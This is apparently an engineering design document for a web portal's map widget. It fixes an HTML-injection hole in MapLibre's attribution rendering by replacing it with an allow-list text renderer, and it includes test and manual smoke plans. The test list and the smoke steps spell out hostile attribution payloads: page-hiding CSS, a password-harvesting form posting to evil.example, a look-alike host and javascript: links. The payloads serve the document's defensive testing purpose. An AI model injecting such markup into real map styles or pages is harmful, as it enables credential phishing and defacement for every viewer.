# Map attribution renders HTML — Condensed design (#928)

**Issue:** [EnterpriseBT/portal-ai#928](https://github.com/EnterpriseBT/portal-ai/issues/928) · Bug · **small / condensed** (discovery + spec + plan + smoke in one doc).

**Why.** A map spec's basemap can be any style URL the portal author names. MapLibre renders every source's `attribution` as HTML, and its sanitizer only removes `<script>`, `<iframe>`, `on*` handlers and `javascript:`/`data:` URLs. Discovery confirmed, against a jsdom mirror of maplibre-gl 6.9's `DOM.sanitize`, that `<style>`, `<link rel=stylesheet>`, `<svg><style>` and a `<form>` with a password input survive whenever text precedes them. A portal author can therefore inject page-wide CSS, a credential-phishing form or a link into the app, for everyone who opens the map. This bites under `BASEMAP_MODE=default` (SaaS); #910's `custom`/`none` modes ignore the spec URL. The fix renders attribution as text, keeping only links to known attribution hosts. It touches `apps/web` only.

## Current shape

| Piece | Location | Note |
|---|---|---|
| Spec basemap may be any URL | `packages/core/src/contracts/map-spec.contract.ts:21-25` | `{ url }`; the agent fills it from a prompt |
| Map uses MapLibre's attribution control | `apps/web/src/modules/MapWidget/MapWidget.component.tsx:207` | `attributionControl: { compact: true }` |
| Control collects runtime source attribution | `node_modules/maplibre-gl/src/ui/control/attribution_control.ts:146-153` | from each tile manager's source, so it includes attribution from a source's **TileJSON**, which arrives after the style |
| Then renders it as HTML | same file `:177`; `src/util/dom.ts:92` | `innerHTML = DOM.sanitize(…)`, a deny-list, not an allow-list |
| Built-in attribution strings | `map-config.util.ts:618` (OSM); CARTO via its TileJSON | links to `www.openstreetmap.org/copyright` and `carto.com` |

## Decision — own the attribution rendering

- **A. Rewrite attributions in `transformStyle`.** Rejected: it only sees the style JSON, not attribution that arrives later through a source's TileJSON, so a hostile style can route around it.
- **B. Allow-list host for spec URLs, or drop `{url}` from the spec.** Rejected for this ticket: either changes the contract or adds install config (#928 would become `full`). It stays a possible follow-up for the arbitrary-host tile egress itself.
- **C. Replace MapLibre's control with our own text renderer (chosen).**
  - Construct the map with `attributionControl: false`.
  - On `styledata` and `sourcedata`, read `map.getSource(id)?.attribution` for every style source.
  - Convert each string with a pure `toSafeAttribution(html): AttributionPart[]`. It parses with `DOMParser`, which is inert and runs no scripts, then walks the nodes:
    - text stays text;
    - an `<a>` whose `href` is `https:` on `ATTRIBUTION_LINK_HOSTS` (`openstreetmap.org`, `carto.com` and their subdomains) becomes a link;
    - **anything else contributes only its text**, so `<style>`/`<form>`/`<link>` are dropped and their CSS text discarded.
  - React renders the parts, escaping by construction, with `target="_blank" rel="noopener noreferrer"` on links.

  This allow-list design blocks markup, phishing links and tracking images regardless of how an attribution arrives. It keeps the ODbL-required OSM credit and the CARTO links, and needs no contract change.

## Plan — 2 slices

**Slice 1: the sanitizer (pure).**
- New: `apps/web/src/modules/MapWidget/utils/attribution.util.ts`, exporting `ATTRIBUTION_LINK_HOSTS`, `AttributionPart`, `toSafeAttribution` and `mergeAttributions(strings)` (dedupe, drop empties and substring duplicates, as MapLibre does).
- New test: `__tests__/attribution.util.test.ts`. Each of the following must yield only text:
  - `<style>`, `<svg><style>`, `<link>`, `<form>` with a password input, `<img onerror>`;
  - a non-allow-listed `<a>`, an `<a href="javascript:">`, an `http:` OSM link, and a look-alike host (`openstreetmap.org.evil.example`).
  - It also checks that CARTO's real attribution keeps both links and that plain strings pass through.

**Slice 2: the widget.**
- New: `MapWidget/MapAttribution.component.tsx` with the pure `MapAttributionUI` (`parts: AttributionPart[]`), overlaid bottom-right and absolutely positioned.
- Edit: `MapWidget.component.tsx`: set `attributionControl: false`, and update a `attributionParts` state from `styledata`/`sourcedata`.
- Tests:
  - `MapAttribution.test.tsx`: links have the right `href`/`rel`, and text renders.
  - `MapWidget.test.tsx`: the mock gains `getStyle`/`getSource`. The constructor gets `attributionControl: false`, and a hostile source attribution renders as text with no `style` element in the document.
- Run from `apps/web`: `npm run test:unit -- --testPathPattern 'attribution|MapAttribution|MapWidget'`, then `type-check` and `lint`.

## Smoke (manual, against your dev stack)

1. **SaaS credits intact.** Under `BASEMAP_MODE=default`, open a CARTO map (the #910 smoke's Map A pin `5d33949a…`). Attribution reads "© OpenStreetMap contributors © CARTO", and both are links that open `openstreetmap.org/copyright` and `carto.com` in a new tab.
2. **Hostile style.** Serve a style whose source attribution is `HOSTILE<style>body{display:none}</style><form action="https://evil.example"><input type=password></form><a href="https://evil.example">Sign in</a>`, and have the agent map sites with that basemap URL. Under `default`:
   - the page stays visible and attribution shows plain text: `HOSTILE` and `Sign in` with no link;
   - `document.querySelectorAll('.maplibregl-map style, .maplibregl-map form, .maplibregl-map a[href*="evil"]').length === 0`;
   - no `<style>` element was added to the page.
3. **XYZ operator attribution.** `custom` with an XYZ template and `BASEMAP_ATTRIBUTION="© Corp tiles <b>x</b>"` renders as the text "© Corp tiles x".
4. **Nothing to credit.** `none` shows no attribution control at all, and the fallback ("Basemap unavailable") shows no attribution.

## Out of scope

- Allow-listing or dropping spec basemap URLs (option B). That is the arbitrary-host tile-egress question: file it separately if it's wanted.
- MapLibre's own `DOM.sanitize` deny-list. That's upstream; we no longer render through it.
